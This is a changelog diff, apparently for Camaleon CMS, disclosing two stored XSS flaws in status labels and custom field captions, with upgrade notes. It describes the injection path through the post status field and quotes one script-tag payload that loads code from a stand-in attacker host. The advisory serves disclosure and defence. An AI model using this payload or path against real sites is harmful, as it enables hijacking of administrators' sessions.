@@ -2,6 +2,49 @@
 
 ## Unreleased
 
+- **Security fix:** Stored XSS in two server-generated HTML fragments. `PostDecorator#the_status`
+  and `CustomFieldGroup#get_caption` assembled markup by string interpolation outside a view, and
+  admin templates rendered the result through `raw` without either escaping the values it spliced
+  in. Both let a non-superuser store markup that executed in an administrator's session on an
+  ordinary admin page, and the admin panel is same-origin with the frontend.
+  [#1218](https://github.com/owen2345/camaleon-cms/pull/1218).
+
+  `the_status` maps the five canonical statuses to labels and falls through to the raw
+  `posts.status` column for anything else, so an injected status always took that arm. The column
+  is writable at contributor privilege — `:create_post` on any post type — because the status
+  parameter is permitted, the model has no `inclusion:` validation on it, and the only guard
+  rewrites the exact literal `published`. Three sinks rendered the label: the post list, the admin
+  search results, and the post edit form, the last firing the moment an administrator opened the
+  odd-looking post to inspect it. `titleize` was not a mitigation: HTML tag and attribute names are
+  case-insensitive and so are DNS hostnames, so a titleized `<Script Src=//Evil.Example/A.Js>`
+  loaded and executed, and a letter-free payload passed through unchanged.
+
+  `get_caption` built its captions in the model, rendered on the custom fields settings page. Its
+  post-type and post titles were already escaped, but the widget, theme and nav menu names were
+  not, and neither was the `object_class` fallback — which the placement check accepts for any
+  class name paired with the current site's id. The privilege required was management of nav menus
+  or widgets plus custom-fields access, again not a superuser.
+
+  `TermTaxonomyDecorator#the_status` was hardened the same way. It interpolates only translated
+  strings and was not exploitable; it is the same pattern reaching the same sink.
+
+  **Notes for upgraders**
+
+  - **A post whose status is not one of the five canonical values now renders that status as
+    visible escaped text instead of executing it.** Rows poisoned before upgrading stay in the
+    database — this is how an operator spots one. Post statuses outside `published`, `pending`,
+    `draft`, `draft_child` and `trash` are supported deliberately, so nothing rejects them on
+    write and no data is rewritten by this fix.
+  - **Output for legitimate data is byte-identical.** Escaping is applied to the interpolated value
+    only, not by rewriting the markup, so a theme matching on the rendered status label or field
+    group caption is unaffected. Both methods now return an `ActiveSupport::SafeBuffer`, which
+    passes through `raw` unchanged and renders correctly through an escaping sink as well.
+  - **The externally reported "Stored XSS via Draft Post Title" is not what this addresses.** That
+    report is not reproducible against 2.9.2 or later: it was fixed by
+    [#1143](https://github.com/owen2345/camaleon-cms/pull/1143), with its access-control half in
+    [#1139](https://github.com/owen2345/camaleon-cms/pull/1139). The two defects above are
+    distinct and were previously unreported.
+
 - **Security fix:** Cross-site custom field group injection. A custom field group carries both a
   `parent_id` (which site owns and administers it) and an `object_class`/`objectid` pair (which
   record's admin page displays it). `Admin::Settings::CustomFieldsController` split the submitted
